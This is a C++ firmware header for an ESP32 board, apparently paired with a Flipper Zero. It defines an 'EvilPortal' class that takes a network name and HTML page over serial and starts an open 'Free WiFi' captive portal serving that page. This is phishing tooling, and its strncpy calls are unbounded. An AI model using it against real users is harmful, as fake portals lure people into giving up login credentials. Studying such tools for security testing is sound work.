#pragma once
#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "CommandLine.h"
#include <WiFiManager.h>

#define MAX_HTML_SIZE 20000
#define SD_CS 10

WiFiManager wifiManager;

class EvilPortal {
private:
  char ssid[100] = "Free WiFi";
  const char *password;
  bool receivingHTML = false;
  String accumulatedHTML = "";  
  bool has_html = false;
  bool has_ap = false;
  char HTML[MAX_HTML_SIZE] = "";

public:
  EvilPortal(){};

  void begin() {
    if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
      Serial.println("failed to connect and hit timeout");
      delay(3000);
      return;
    }

    Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
  }

  void loop(CommandLine CLI) {
    if (!has_html || !has_ap) {
      if (Serial.available() > 0) {
        String flipperMessage;

        if (!receivingHTML) {
          flipperMessage = Serial.readStringUntil('\n');

          if (flipperMessage.startsWith("sethtml=")) {
            Serial.println("Found HTML Tag");
            receivingHTML = true;
            flipperMessage = flipperMessage.substring(strlen("sethtml="));
            accumulatedHTML += flipperMessage;
          } else if (flipperMessage.startsWith("setap=")) {
            Serial.println("Found Access Point Tag");
            flipperMessage = flipperMessage.substring(strlen("setap="));
            strncpy(ssid, flipperMessage.c_str(), flipperMessage.length());
            has_ap = true;
            Serial.println("ap set");
          } else if (flipperMessage.startsWith("reset") || flipperMessage.startsWith("stop")) {
            Serial.println("reset Tag Found Rebooting");
            delay(1000);
            esp_restart();
          } else {
            CLI.loop(flipperMessage);
          }
        } else {
          flipperMessage = Serial.readString();
          accumulatedHTML += flipperMessage;

          if (accumulatedHTML.endsWith("</html>")) {
            strncpy(HTML, accumulatedHTML.c_str(), accumulatedHTML.length());
            has_html = true;
            Serial.println("html set");
            receivingHTML = false;  
            accumulatedHTML = "";
          }
        }
      }
    } else {
      digitalWrite(B_PIN, LOW);
      digitalWrite(R_PIN, LOW);
      Serial.println("all set");
      begin();
    }
  }
};